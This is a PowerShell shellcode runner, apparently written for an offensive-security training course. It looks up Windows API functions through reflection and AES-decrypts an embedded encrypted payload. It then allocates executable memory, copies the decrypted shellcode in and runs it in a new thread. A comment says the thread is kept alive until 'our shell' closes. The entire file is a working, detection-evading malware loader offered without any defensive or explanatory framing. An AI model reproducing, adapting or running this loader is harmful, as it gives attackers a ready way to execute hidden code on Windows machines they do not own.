function LookupFunc {
    Param (
        $moduleName, 
        $functionName
    )
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $tmp += $_ } }
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    
    # Creates our assembly and defines the module and type
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    
    # Sets up the constructor
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    
    # Sets up the invoke method
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    
    # Done
    return $type.CreateType()
}

function Decrypt-Bytes($Bytes, $Key, $IV) {
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.KeySize = 128
    $aes.BlockSize = 128

    # Keep this in mind when you view your decrypted content as the size will likely be different
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros

    $aes.key = $Key
    $aes.IV = $IV

    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
    $decrypted = $decryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length) 
    $aes.Dispose()
    return $decrypted
}

# Allocate our memory buffer
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Encrypted Payload
[Byte[]]$Offsec = 
0x9a, 0x02, 0x86, 0x45, 0xef, 0x11, 0xb7, 0x7e, 0x86, 0x1e, 0x54, 0xa3, 0xb8, 0x4b, 0xd3,
0xe1, 0xec, 0x8e, 0xd4, 0x3f, 0x77, 0xe3, 0x1d, 0x5b, 0x2c, 0x90, 0x9b, 0x94, 0x25, 0x8c,
0xb6, 0xd4, 0x7c, 0xf6, 0x8b, 0x80, 0x82, 0x38, 0x86, 0x46, 0xe5, 0x10, 0x4f, 0xec, 0x69,
0x87, 0x48, 0xc9, 0x8e, 0x3b, 0x2a, 0x91, 0x58, 0x86, 0xf5, 0x9c, 0x99, 0xea, 0x11, 0x45,
0xe7, 0x15, 0x5d, 0x46, 0x75, 0xd4, 0x65, 0x8d, 0x7e, 0x54, 0x1e, 0x0c, 0xdb, 0xf6, 0xa9,
0xd2, 0x9a, 0x69, 0x9c, 0x7a, 0x3d, 0x62, 0xa1, 0x2e, 0x84, 0x26, 0xbe, 0x89, 0x65, 0xfe,
0x03, 0x68, 0x3d, 0xc7, 0x13, 0xd4, 0x16, 0x2b, 0x56, 0xf9, 0xc3, 0x38, 0x62, 0xc2, 0xb3,
0xdd, 0x70, 0xf6, 0x58, 0xa3, 0x56, 0xdf, 0x74, 0x47, 0x8a, 0x25, 0x71, 0xed, 0x27, 0xe1,
0xe0, 0x48, 0x5f, 0x0c, 0x9c, 0x50, 0x7c, 0xa1, 0xa3, 0x32, 0x86, 0xc7, 0x57, 0xdf, 0x59,
0x7e, 0x8b, 0x85, 0x94, 0xb5, 0xa2, 0x73, 0xf5, 0x89, 0x19, 0x9a, 0x97, 0x26, 0xc0, 0xae,
0x83, 0x2b, 0xe0, 0x65, 0xd2, 0xb6, 0x7f, 0x0d, 0xab, 0x96, 0x96, 0xe7, 0x52, 0xf9, 0x12,
0x21, 0xc1, 0x5d, 0xeb, 0x18, 0x51, 0x83, 0x8a, 0xa2, 0x3e, 0x55, 0xc9, 0x42, 0x3d, 0x93,
0xa9, 0xda, 0xde, 0x6f, 0x3d, 0x09, 0x46, 0x2c, 0x8c, 0x06, 0x96, 0xeb, 0x79, 0x81, 0x77,
0x74, 0xad, 0xac, 0x23, 0x6b, 0x8c, 0x9d, 0x75, 0xb6, 0x4a, 0xef, 0xf5, 0x4f, 0xda, 0xc4,
0x77, 0xeb, 0xfb, 0x75, 0x69, 0x17, 0xda, 0xbc, 0xae, 0xc8, 0x43, 0x90, 0x0b, 0xbf, 0x9a,
0x5a, 0x57, 0x53, 0xd7, 0xd5, 0xed, 0xaa, 0x7c, 0xdf, 0x6e, 0xfc, 0xb7, 0xf8, 0x8a, 0xd8,
0xda, 0x57, 0xf2, 0x67, 0xca, 0x73, 0x9c, 0xd5, 0xd1, 0x9e, 0xaf, 0xf4, 0x49, 0x1c, 0xef,
0xf6, 0xc1, 0xb4, 0xbb, 0xc6, 0xc2, 0x4c, 0x13, 0xab, 0x99, 0x7e, 0x07, 0x1f, 0xac, 0x4f,
0xc4, 0x9e, 0xb2, 0x9d, 0x6e, 0x96, 0x12, 0x3e, 0xfe, 0xe7, 0xb1, 0x34, 0x2c, 0xe0, 0x77,
0x6a, 0xb9, 0x9d, 0x67, 0x35, 0xce, 0x6b, 0x10, 0x8e, 0x2c, 0x06, 0x7e, 0x13, 0x20, 0xfb,
0x2c, 0x26, 0xb3, 0x60, 0xe3, 0xf5, 0x56, 0x4e, 0x27, 0xf5, 0x0c, 0xcc, 0x99, 0xab, 0x2d,
0x15, 0xc8, 0xbc, 0x52, 0xf9, 0xae, 0xff, 0xc5, 0x77, 0x7b, 0x54, 0x5d, 0x4c, 0x06, 0x75,
0x19, 0x8d, 0xab, 0xd4, 0x0f, 0xa5, 0x05, 0xe9, 0x87, 0x81, 0x0e, 0x17, 0x84, 0x3d, 0xb3,
0x26, 0x47, 0xbf, 0xc4, 0x8f, 0xe6, 0x15, 0x6c, 0x02, 0x46, 0x6b, 0x9b, 0x66, 0x53, 0x6a,
0xd2, 0x42, 0x7f, 0xfa, 0xa5, 0x9a, 0xdb, 0x4e, 0xda, 0xa4, 0xb7, 0xf2, 0xa0, 0xab, 0x27,
0x82, 0xea, 0xaa, 0xef, 0xc6, 0x6d, 0x60, 0xbe, 0x48, 0x64, 0x9d, 0x50, 0xef, 0x5b, 0xa2,
0x27, 0xb3, 0x2b, 0x72, 0x0d, 0x1b, 0xbf, 0xc3, 0x17, 0xeb, 0xc1, 0x22, 0x58, 0xb3, 0xd9,
0xad, 0x5a, 0x25, 0xe5, 0x67, 0xe5, 0xdd, 0x20, 0xba, 0x96, 0xdd, 0xda, 0x57, 0x64, 0xa3,
0xde, 0xb9, 0x04, 0x87, 0x5f, 0xd2, 0x15, 0x63, 0xee, 0x1e, 0xd2, 0xe9, 0xea, 0xa1, 0x99,
0xf2, 0x23, 0x4c, 0x10, 0x10, 0x1e, 0x01, 0x68, 0xd8, 0x00, 0xa6, 0x5f, 0x08, 0xd7, 0x51,
0xb6, 0x49, 0x0f, 0x66, 0x24, 0x29, 0x77, 0xd9, 0xc4, 0x23, 0x30, 0x26, 0x96, 0xb3, 0x96,
0x77, 0x9c, 0x72, 0x8c, 0xe9, 0xbc, 0x96, 0xdd, 0x47, 0xc1, 0x89, 0x59, 0x96, 0x84, 0x6e,
0xd4, 0x9b, 0xd1, 0xe0, 0x47, 0x64, 0x29, 0xda, 0x61, 0xb0, 0x1f, 0xab, 0x9b, 0x19, 0xef,
0x18, 0xa6, 0xa2, 0xcd, 0x8b, 0xf1, 0xac, 0xc3, 0x1b, 0xf7, 0x14, 0x76, 0x6a, 0xf8, 0xec,
0xc0, 0x23

# Key
[Byte[]]$Says = 
0x4c, 0x60, 0x2c, 0xbc, 0xc7, 0x0e, 0xae, 0x78, 0x33, 0xfb, 0xc6, 0x9c, 0xaa, 0x80, 0x78,
0x68, 0x58, 0x23, 0xe0, 0xaa, 0x8f, 0x6b, 0x79, 0x6c, 0xe8, 0x2b, 0x6c, 0x4f, 0x93, 0xd2,
0x87, 0x62

# IV
[Byte[]]$TryHarder = 
0xa8, 0x6f, 0x9f, 0x7a, 0x47, 0x8a, 0xf5, 0x78, 0x57, 0x54, 0xa6, 0xe5, 0x6c, 0xc7, 0xbc,
0x19

# Decrypt our shellcode
$buf = Decrypt-Bytes -Bytes $Offsec -Key $Says -IV $TryHarder

# Copy our shellcode into the buffer
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# Create an execution thread using the instructions at the memory address of our shellcode
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Execute our thread and ensure it doesn't exit until we close our shell
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)   
